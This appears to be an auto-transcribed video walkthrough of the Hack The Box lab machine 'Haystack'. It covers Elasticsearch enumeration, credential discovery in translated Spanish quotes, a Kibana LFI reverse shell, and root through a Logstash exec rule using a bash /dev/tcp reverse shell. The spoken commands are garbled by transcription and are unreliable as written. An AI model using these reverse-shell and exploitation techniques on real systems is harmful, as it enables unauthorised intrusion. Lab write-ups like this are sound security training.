 what's going on YouTube the zipsak and we're gonna be doing haystack from hack the box which has elasticsearch to point on it also known as elk but it's kind of deployed in the upside down meaning things aren't as they're supposed to be the elasticsearch service on port 9200 to all users instead of just local owes to other members of the elk cluster while caba√±a the front end that most people use to elasticsearch is exposed only on localhost on the standard port 5601 so you have to manually search through the elastic database using the REST API and you'll also notice the database is all in Spanish so if you can't read that you'll have to do some google translation or some way to actually get it into a readable form you find the needle in the haystack which is SSH credentials you get into the box and then you have to escalate to the Cabana user in order to exploit a bad log stash rule and that will get you root so with all that being said let's just jump in as always we can with the end map so - I see four default scripts as B enumerate versions Oh a I'll put all formats put in the end map directory and call it a staff and then the IP address which is ten ten ten one fifteen can take some time to run so I've already ran it looking at the results we have three ports open the first one being SSH on port 22 and it's banner just says it's OpenSSH 7.4 and then we have HTTP on port 80 and it's bandages says it's nginx we have another HTTP on port 9210 is also running and next the main difference i see right away is from this HTTP - title script and port 80 is saying it is text slash HTML and on point 9200 it's saying it's application slash json so since this is serving out JSON output chances are this is some type of API because humans generally don't just get raw JSON so keep that in the back of the mind and we'll poke at port 80 at first so going to 10 10 10 115 we just get a picture of a needle in a haystack I'm going to check like robots start texts to see if there's anything else interesting we could do go bust right on it as well I don't think it returns anything the only thing interesting I could find is if you save the image as Needle JPEG and then do exist tool on the file we see that it was a modification date time which is today October 22nd but if we do a double you get against this instead of just downloading it with the web browser we won't clobber this metadata and you can see when the file was probably uploaded to the web server and that was not my clipboard so let's do W get this one and now we do a exist tool on this version and you can see January 25th so may give you something for like a forensic case always use like W get or curl to download the images if you just download it off of Firefox it may overwrite this metadata so again if we look at the one in downloads actually if we can split the pain exist tool downloads needle and again you can see October 22nd and January 25th so a little interesting nothing too big there so let's go poke at port 9200 so just going to the web browser and going to 9200 we see this JSON output you can also if you want to burp suite and we turn intercept on which is refresh the page and then we can say engagement tool not that do intercept the response so now we don't descend it over to repeater we're just gonna intercept what this page responds with and you can see it's content type is application slash JSON so that's why I Firefox is displaying it this way we see it says the cluster name is elasticsearch so we see well this is going to be a like database elasticsearch is a database essentially the build type says RPM so we know this is probably either CentOS or Red Hat if it was not Deb we know it's like Ubuntu or Debian so since it was installed like that that's how we know it we also have the version number 6.4 so what I would generally do if I don't know elastic searches API is just Google elastic search API 6.4 to get the relevant documentation and we have to turn burp intercept off to go to the page and generally when you use elastic search you deal with Gabanna which is a front end to this what kind of an upside-down where Qabbani is not exposed to us but elastic searches so the documentation has a lot of good things unfortunately it's not ordered in the way I'd want to go over it a document API is interesting this is like tables and SQL and then the cat API is also what we're going to look into because this gets a bunch of just information about elastic search itself so we can see if you do get underscore a cat slash master you can see information about it so we can do underscore cat slash master and we see this if you ever want to know what those mean you can do it like a question mark V for verbose and it will put the headers on the table and the cat API just returns with lines so it kind of behaves like the cat command I think that's why it's called that if you've curl this you can see again that's just outputting in lines when we get to the other API is they will output as JSON so that's kind of I guess how you know if you don't know the commands you can just go to underscore cat and it will output all the various things you can do so the main thing I want to look at is I believe indices which is like databases so we can look at cat slash indices or maybe tables is a better way to describe them then databases know underscore my bad and we can see there are let's just do question mark V and if you did question mark H as well I think you just say help it gives you information about it but these should be enough what we want to do we see health green yellow this is part just because it's not like redundant or something status open the index we have Cabana quotes and Bank so these are like tables and SQL the unique identifier quotes has 253 documents in it and then Bank has a 1000 think of documents like rows and you can see the size so if we go over to the other API let's go to like the document API we can go to the document get and we can say get the industry name underscore doc and then 0 for document 1 so if we go to quotes underscore doc slash 1 found false maybe that's not how you use this I'm just gonna use the search command I actually don't know elastic off top my head but search will give us kind of what we want and if you do j q dot to kind of filter this we can make sense of the output if we don't do JQ it's just this blob you can do question mark pretty and it will print it with line breaks but I like using JQ because we will be able to sort through this I'm also just gonna add this curl - s if you notice when I ran this before it printed the header of my curl command right here so - s is gonna get rid of that so if we go to search and then say size is equal to 1 it will only return 1 item so this will help us do a JQ command so if we do JQ period and I want to go to hits because the main information I see that's unique in here is quote so when you see there squarely break it bracket you just do a period and then the name you want so the first one is hits and now we went one level as we Z we start so if we go to the previous command we start right here so dot hits and then we want hits again we have 253 documents in this search so we can do space dot hits and we have to put this in quotes unless is going to treat each of these as an argument and we just want to do one big search and now we have a square bracket so this is went into a list and you identify list by what item it is so you may have had two in this case there's only one so if there was a comma right here after the squiggly bracket and then more information so let's go copy this the temp paste 1 2 3 4 5 6 7 8 so let's do 6 yank maybe like this no probably right here if it is a comma and then this this is 0 and this will be 1 so something like that so hit 0 is just going to get rid of this one bracket if we do hits 1 it doesn't exist and then the next thing we want is dot underscore source because that's the next item down and then we want dot quote and we can get quote so now when we take off the size parameter it had I think 253 documents so we can do size equals that we can get if I do hits with nothing so it's 1 so in this let's do hit size equals 2 and get rid of these two we actually see what I was saying we want to get rid of this so if I didn't go into VI you can see a square bracket 0 & 1 if you don't specify anything it just grabs them all so that's why I did before so I'm gonna do hits 1 hits just open closed bracket dot source and then quote and that's going to go into each of these items and pull the quote so that's what that did if it was size - it would pull two quotes we do see this is in Spanish so using Jake you probably is not the answer here and if we wanted to we could also do the other one what was it if we go to Cat indices there's Bank so if we look at Bank we could see the information here whoops quotes thank 1 not quotes think underscore search size 1 so in this one we want hits again then we want dot underscore source oh no we want hits so we want this then that's the number result so we'll do open closed bracket and then whatever information we want out here so if we wanted to dump all the emails we need underscore source and dot email and if we change the size this one had a thousand you can dump all the emails the problem we have with the quotes database is if I can get back to it quickly it's all in Spanish so using the JQ probably isn't gonna help us for this we probably should just use Python because we can send this to some type of translate service and translate the courts database and make sense of it so let's do VI I'll just call it exploit PI and we first need with our request module so we'll do import requests we need the JSON module as well to be able to parse this JSON so we'll try a is equal to request dot get HTTP 10 10 10 115 9200 quotes slash underscore research question mark size is equal to 1 while we test things out and I'm also familiar that there is a tool quarter last a dump I think to dump elasticsearch databases but I don't feel like you really learn anything just doing that so that's why we're doing this all manually you got json dot loads all right dot txt and i suppose we can do this in Python 3 so we can play with this so let's copy this go down here import request JSON die of HTTP so HTTP bad habit or good habit I guess so if we do it response 200 text is the JSON so we can do quotes is equal to JSON loads or dot text and now we have a Oh no--what variable this is a dictionary so to parse this we can do quotes hits like this and then we can go in this again so it's just like we did with JQ 0 gets that and then source so we can go through it this way what I'm going to do is a loop so we're going to go to this level and we do a for loop it'll go through each item so we should change this to size equal to so if we do go to hits it zero and get that one hit it oh we don't really load the JSON or Euler to the request but not the JSON so one will get the second quote zero gets the first so we want to do for a quote and set of quotes and quotes hits hits and then Q is equal to quote we want underscore source right here and then quote is the next one so do this quote okay print queue so if we do Python 3 exploit PI we get the quote so if we do up here size is equal to 2 we get 2 quotes and we can see that better if we just put a line break between the two and you can see the two quotes so now we have to translate this so I'm just gonna Google Python translate and let's see python translate google maybe there we go there's a google transp raj echt so we're just going to abuse google translate this just gives us a Python library to use it we can see we do pip install google trans and then it translated equals translator and translator translate the text I guess I don't have Korean so I can't see there's characters so yeah let's just do quit out that pip3 install google trans it's downloading installing and let's do this back in Python 3 so R is equal to request that was my Windows sorry about that then change the size to 1 we have to import libraries so import request JSON and Google oh it says to do from google trans and port translator so from google trans input is a capital T it is translator so now we can do that request and then we gotta do the JSON loads and we want to get the quote so if we do quotes Q is equal to quotes hits hits zero for the first object this will be probably underscore source and then quote I think Q okay now we just got the Spanish translate a Spanish thing so this says to do translator is equal to translator so translator is equal to translator and then translator translate translator dot translate queue and we see it's an object if we read the page more I think if we do dot text we get the translation if it's not translating you can also do like SRC is equal to es for espanol and DST would be en well I don't know what that is let's see s OCD est for a destination language so you can tell it what languages but just ringing through the API that's how you use this object so now we can modify or script to use this so from translator import Google trans my bad google trans input translator translator is equal to translator and then we'll say QT is equal to translator translate Q dot txt put it this way just for sanity sake before you print QT we'll see if we did this correctly there we go so now we are translating this database so now the final thing is to just get all the documents which I think was 253 and when we run this we can do T to also save the output into a file I'm gonna say quotes dot txt and we'll call this translated text and I guess it's not to print until oh it's got some type of buffer so here we are just outputting all the text I'm going to let this run so now that this has finished running we can do LS and then look at the quotes - translated text file and see all the quotes in English so we can either read through 253 quotes or we can grab it for words that we think may be good maybe password passwords not there remember this is a translation so things may not be one-to-one so other phrases that passwords known as maybe secret secret doesn't return anything key and key returns a few hits it looks like four so one two three four and then we get some base64 so I'm going to do echo - n the base64 pipe it to base64 - D and we see user is equal to security and then we can try this one echo - n this has a space equals I'm just gonna get rid of that space I'm guessing that's a translation goof and we do base64 - D and we see Spanish is key if we do it without the space it'll probably still work yeah it just says invalid input because speckles is just a padding character so with user security and pass as it Spanish is key we can try SSH so SSH security at ten ten ten 115 yes to accept it wait for SSH - I guess fail this reverse looked up so I'm not sure why this is taking a while I'm guessing maybe the Etsy host file has the wrong host name Spanish dot is that key cat that's the house yeah it doesn't know it as haystack and it probably doesn't know me and what if we added it as haystack if it'll speed that up what's during the reverse lookup on my host name either way we're on the box you can do WCC use of that text we can that but now we have to prove ask so I'm going to grab a letter noon so CP opt when a noon when a noon got Sh here I've got to make the dub dub dub directory and we can just move that into dub dub dub and then Python sham simple HTTP server and then curl Tenten I think I'm 14 3 if config done 0 14 3 port 8000 Lynn a new message pipe it over to bash and let these checks run I guess we could look at it while it's going so remember we stopped at super user account if we do when a noon we can start saying things so the first thing we have is the kernel and we see this was built November 29th and keep in mind that the image we pulled off the server was January 1st so there's been about probably three to four months that the server has not been patched assuming there's a new kernel every month I'm not exactly sure what the release cycles like we have GCC and it's saying it's a red hat box could also be Santos as we see right here Santos is just like the Red Hat fork for free let's see nothing really there and Red Hat just provides you support and some extra packages like the Red Hat satellite server and other things but I digress host names haystack user looking at the groups we have some SELinux information so maybe you have to look into that we have used that login in a system route from TTY and security from pts hero or IP address well you know other groups on the Box we do see Cabana so gabbana is installed so that's something to keep in the back of our mind we also have walled stash so this looks like the elk stack elasticsearch log stash and Cabana the most common elastic installed I've seen users of the box nginx and a Cabana user let's go back to was it super user with a capital S there we go searching down permissions on home directories we only have security there so we have a log stash user a Cabana user elastic search user but only security has a home directory social security is probably the account that's meant for users to log in hidden files probably not too interesting would readable from home home directory contents environment information selinux status is enabled but it's in permissive mode so it's not gonna be blocking us new mask cron jobs probably not interesting system d timers looks like it's all default IP address we know that we have listening IPS and we see we're listening on port 5601 on localhost and i believe this is the default Cabana we also have port 9300 I'm not exactly sure what that is maybe log stash since we saw a log stash user we see UDP as well on port 323 and running processes we see let's see what is this user bin Java log stash so this is the log stash running as root so this is definitely interesting we want to get log stash to do something because that is running is route generally log stash has its own user we have the elastic user we also have a Cabana user so that's probably port 5901 so I'm just gonna stop looking at this and let's go examine port 5901 so curling one twenty seven zero zero one five nine zero one what sson 5601 my bad 5901 is maybe a VNC port but here we do see we got Cabana so I'm going to do SSH forwarding you could either re log in the box and use the - L flag to do local port forwarding but I'm just gonna do the shortcut and the shortcut is you type squiggly sea and get into a command prompt so squiggly sea and you have to do it the very first thing you type on a new line so we can just do a capital L 56 or 1 this is going to listen on 5601 and Ford it do this so actually this may make more sense for demoing like port forwarding stuff out I hate using the same point on both ends because you don't understand it oh you don't understand what this is doing there's by default a one 2700 one : this and this is going to be listening on my local box and then it's going to forward it through this SSH session go to this IP on this port if you don't understand this maybe check out the reddish video or EDD is H or I go into port forwarding a lot more but if we go to for this port we can go back to our box and do SS - Ln this is just the new netstat and we can see we are listening on one 2700 150 602 so if we went over to Firefox go to 127 zero zero one five six zero two we see kibana load so this is going through that SSH and accessing the server on port 5601 so with elasticsearch here we can go maybe to management and see it's version six four two and if we do cabana 6 4 2 and maybe do like release notes see when this was released and see how old it is view the release notes here come on where's a date bugfixes I don't even know what the data is for this I guess we could just shortcut this instead of looking for a date we can just search for six for to exploit and we get to this CVE which goes into a local file inclusion vulnerability if we go to API console API server and then direct it to a JavaScript file it looks like it will execute it and they give us a JavaScript file of a reverse shell so let's grab this and on this server we can go to dev sh m and we'll call this rev J s paste this in and then we got to tell it where to connect so let's I guess we can leave it at port leet and then we want it at 10 10 14 3 which is my IP address WQ + Co V and P 1 3 3 7 and we can then go to that IP address so copy this and go curl localhost 50 602 and we could also do it from that box and just do 5601 but well as well just do it this way dev sh m was at rev KS bad request API console let's do LS dev sh m OS so we have a few files here let's just remove them all was I can't remove test rev J s and we'll paste this again paste 10 1014 three-on-one 337 we're listening so we can call this again 400 there we go so I guess what probably happened is since I didn't have this in single quotes bash probably did some weird processing and didn't convert this your change the URL to something it probably actually trimmed it after this and because that's a special character so putting it in the single quotes let it work so if we do an LS down here we have information and this is kind of important this is why I always do too verbose flag with n map if we get rid of this and we just did this without the V just lmp1 337 and curl you never get any input because the server just gave us a shell and didn't do anything could do LS we should have got something did we just crash the server please say we didn't let's go back to Kabana the load loading Kabana go to a page we haven't done so we know it's not in cache okay so we definitely did not crash it OS come on demo gods let's just grab this piece it here LS Who am I well we definitely had a shell once upon a time I'm not exactly sure what happened to it bi r EV j s this file still exists let's move this to rev - Jas shouldn't do anything but never know there we go so I guess you just can't use the same name maybe something's hyung so let's do rev 3j asked to show this so NC l NP r-- f 3j s so here we have a shell if we do LS we get command prompt back so that's why I always like doing lv n P in case the server doesn't send you anything you still get noticed that you have a shell so rav4 j s and we get in so let's do a real shell Python - C input PT y PT y dot spawn Ben - okay control Z s TTY raw - echo and hit F G Anna you won't see any input hit enter again and you get a show with tab order completed things so we are now the Cabana user so we can do like find / - user cabana and see what we have access to right - I also want to do - LS that is a lot of files we have access to we can try - group cabana I'm assuming it's cabana cabana and we can see things as well we know log stash is running as root so we can go Etsy logstash and start reading this config to see what's in here and we see it's owned by root and the group is kibana yeah so if um went through that group output you would see that we have access to these files and this is why we can't access them as security because if we just go to this show CD let's see well we can access these but if we go to Etsy logstash Kampf dot d these are only readable by Kabana these last three permissions are everyone permission and we don't have access to these so if I had done enumeration a bit differently and solve these files as a security user it would be more obvious that we have to jump over to the Cabana user to get to these files so let's go to Kampf dot D instead reading these files so Kat filter comp we see filter type execute grok is kind of like grep and log stash and then match message is equal to I don't even know how to say that command o : and then a variable so if we look at input Kampf we see the path is opt Kabana log stash underscore star start positions be getting intervals 10 seconds type is an execute and mode is read we can output Kampf we see if type is execute which this is doing then exact command commando so it kind of gives in three formats with three paths let's just export term is equal to X term so I can clear the screen last dive log stash has the input and this is how it's going to get data and then you got the filter and then you get output so it comes in and put is a file and we specify the file name and we add this type to it so we added execute so it goes through the filter and then now the type is equal to execute and now we're matching a line that we write in the file and then here in output now we're taking something and doing in action so if we copy this command just so we have a feel for what we have to do and go to opt Kabana logs - underscore please subscribe we just to match stir which is pretty much anything and then paste this and then run so write or command so we want to do eg EC utar backslash s space commando space semicolon space command so what we can do is dev s hm leave a comment and then I guess we can do a second one and try to bash I dollar this dev TCP 10 1014 three point nine thousand one thing at zero and one see if that's right and I guess before we write we should split the pain and see LVN p 9001 so write this and then we can cat opt logs - but was it opteka Bona logs - please subscribe we see your commands so we can do watch - n1 dev sh m and we're just waiting for LS l a dev I said gem waiting to see the please subscribe file if we see please subscribe we can look at who owns it if it's root then we know we have a code execution path and we just messed up on a reverse shell so just gonna wait probably a minute or two to see if we ever get a file if we don't get a file we probably screwed up with how we did the please subscribe file so just gonna wait here well in some weird situation I got the show correct but I messed up the touch command or whatever the command I wanted to do to output something if we go to LS oh shoot I didn't put touch so if you're confused I meant to do the command touch space slash dev as a gem leave a comment so we created a file but thankfully the reverse shell worked and we can see we got a shell from haystack root at haystack so if we go to CD / root LSL a WC - c root dot txt we could see the flag so generally I guess we're living in upside-down world right now because elasticsearch normally isn't exposed on the routable interface it's only exposed on localhost and Cabana is on that routable interface and that's kind of reversed on this box and also reversed my proof of concept touching a file is this failsafe that should always work and the reverse shell this one's iffy because we have so many special characters but then the reverse shell worked and I screwed up touching a file so yeah let's just get this right real quick so if we do VI op this OH let's now copy this VI holy night hit copy oh I did thank God and now we just do touch and now we do that watch - an ls1 we should get a file created within like maybe ten seconds to a minute so let's just see this file get created okay it's been way too long and I still don't see that file so let's go back off to Qabbani LS LS away we can cat this and that looks fine let's just rename this maybe it remembers the foul name and keeps that open so long - let's just do please work and hopefully this time we get it so watch - n1l SLA dive sh m we're doing a touch on that it shouldn't be this hard to get a file created especially when we get a reverse shell so oh there we go finally right off the bat it works so if you have issues make sure you change file names because the file name affects both the reverse show as the Cabana user and apparently the file that logs - execute so with that being said that is the video take care and I will see you all next week